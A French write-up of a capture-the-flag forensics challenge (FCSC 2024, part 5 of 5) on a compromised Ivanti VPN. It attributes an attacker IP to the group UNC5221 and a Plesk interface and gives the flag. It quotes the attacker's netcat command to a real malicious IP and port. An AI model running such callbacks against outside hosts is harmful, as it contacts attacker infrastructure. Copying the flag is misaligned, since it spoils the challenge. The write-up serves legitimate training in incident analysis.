
https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-5/

## Description

Vous venez d’être embauché en tant que Responsable de la Sécurité des Systèmes d’Information (RSSI) d’une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : `VPN compromis (intégrité). Version 22.3R1 b1647`.

---

Vous avez presque fini votre analyse ! Il ne vous reste plus qu’à qualifier l’adresse IP présente dans la dernière commande utilisée par l’attaquant.

Vous devez déterminer à quel groupe d’attaquant appartient cette adresse IP ainsi que l’interface de gestion légitime qui était exposée au moment de l’attaque.

Le flag est au format : `FCSC{<UNCXXXX>:<nom du service>}`.

**Remarque :** Il s’agit d’une véritable adresse IP malveillante, **n’interagissez pas** directement avec cette adresse IP.

Cette épreuve a été découpée en cinq parties :

- [Horreur, malheur 1/5 - Archive chiffrée](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-1/).
- [Horreur, malheur 2/5 - Accès initial](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-2/).
- [Horreur, malheur 3/5 - Simple persistance](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-3/).
- [Horreur, malheur 4/5 - Pas si simple persistance](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-4/).
- [Horreur, malheur 5/5 - Un peu de CTI](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-5/).
## Write Up

La seule info qui n'a pas été reprise de l'exercice 3, est cette commande 
```bash
nc 146.0.228.66:1337
```

On doit déterminer à quel groupe d’attaquant appartient cette adresse IP ainsi que l’interface de gestion légitime qui était exposée au moment de l’attaque.

Virus m'a retrouvé un fichier des IOCs du groupe UNC5221 où figure cette IP :
![[Pasted image 20250212102458.png]]

Après toujours sur virus total, un bot nous pointe vers ce blog : https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-zero-day-exploitation/?hl=en
Qui nous indique bien que cet IP est un IOC du groupe UNC5221 !

Et cet IP a pointé sur des certificats SSL "zen-snyder.146-0-228-66.plesk.page" :
![[Pasted image 20250212102531.png]]
Donc on se doute d'un Plesk installé dessus

Le flag est donc **FCSC{UNC5221:plesk}**.